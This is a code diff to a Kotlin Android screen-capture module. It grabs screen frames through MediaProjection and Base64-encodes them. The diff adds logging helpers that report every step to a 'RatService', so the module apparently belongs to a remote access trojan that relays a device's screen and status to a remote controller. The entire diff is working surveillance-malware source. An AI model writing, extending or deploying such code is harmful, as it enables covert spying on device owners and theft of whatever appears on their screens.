@@ -29,7 +29,17 @@ object ScreenCapture {
     private var imageReader: ImageReader? = null
     private var projectionCallback: MediaProjection.Callback? = null
 
+    private fun slog(msg: String) {
+        Log.i(TAG, msg)
+        RatService.instance?.sendLog(TAG, msg)
+    }
+    private fun elog(msg: String) {
+        Log.e(TAG, msg)
+        RatService.instance?.sendLog(TAG, "ERR: $msg")
+    }
+
     fun requestIntent(ctx: Context): Intent {
+        slog("requestIntent")
         projectionManager = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                 as MediaProjectionManager
         return projectionManager!!.createScreenCaptureIntent()
@@ -37,7 +47,7 @@ object ScreenCapture {
 
     fun onActivityResult(ctx: Context, code: Int, data: Intent?) {
         if (code != Activity.RESULT_OK || data == null) {
-            Log.w(TAG, "Denied")
+            elog("Denied by user (code=$code)")
             projection = null
             return
         }
@@ -48,22 +58,21 @@ object ScreenCapture {
             }
             val newProjection = projectionManager!!.getMediaProjection(code, data)
 
-            // unregister callback lama kalau ada
             projectionCallback?.let {
                 try { projection?.unregisterCallback(it) } catch (_: Exception) {}
             }
 
             projectionCallback = object : MediaProjection.Callback() {
                 override fun onStop() {
-                    Log.w(TAG, "MediaProjection stopped")
+                    slog("MediaProjection onStop")
                     projection = null
                 }
             }
             newProjection.registerCallback(projectionCallback!!, Handler(Looper.getMainLooper()))
             projection = newProjection
-            Log.i(TAG, "✅ Ready")
+            slog("Ready — MediaProjection granted")
         } catch (e: Exception) {
-            Log.e(TAG, "onActivityResult error", e)
+            elog("onActivityResult exception: ${e.message}")
             projection = null
         }
     }
@@ -74,6 +83,7 @@ object ScreenCapture {
 
     fun release() {
         try {
+            slog("release")
             virtualDisplay?.release()
             virtualDisplay = null
             imageReader?.close()
@@ -85,7 +95,7 @@ object ScreenCapture {
             projection?.stop()
             projection = null
         } catch (e: Exception) {
-            Log.e(TAG, "release error", e)
+            elog("release error: ${e.message}")
         }
     }
 
@@ -93,6 +103,7 @@ object ScreenCapture {
     fun capture(ctx: Context, callback: (String?) -> Unit) {
         val proj = projection
         if (proj == null) {
+            elog("capture called but projection null")
             callback(null)
             return
         }
@@ -107,6 +118,8 @@ object ScreenCapture {
             val width = (metrics.widthPixels * scale).toInt()
             val height = (metrics.heightPixels * scale).toInt()
             val dpi = (metrics.densityDpi * scale).toInt()
+
+            slog("capture virtual display ${width}x${height}")
 
             val reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
             imageReader = reader
@@ -141,7 +154,7 @@ object ScreenCapture {
                         val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                         callback(b64)
                     } catch (e: Exception) {
-                        Log.e(TAG, "Encode error", e)
+                        elog("Encode error: ${e.message}")
                         callback(null)
                     } finally {
                         try { image.close() } catch (_: Exception) {}
@@ -153,7 +166,7 @@ object ScreenCapture {
                 }
             }, Handler(Looper.getMainLooper()))
         } catch (e: Exception) {
-            Log.e(TAG, "capture error", e)
+            elog("capture error: ${e.message}")
             callback(null)
         }
     }
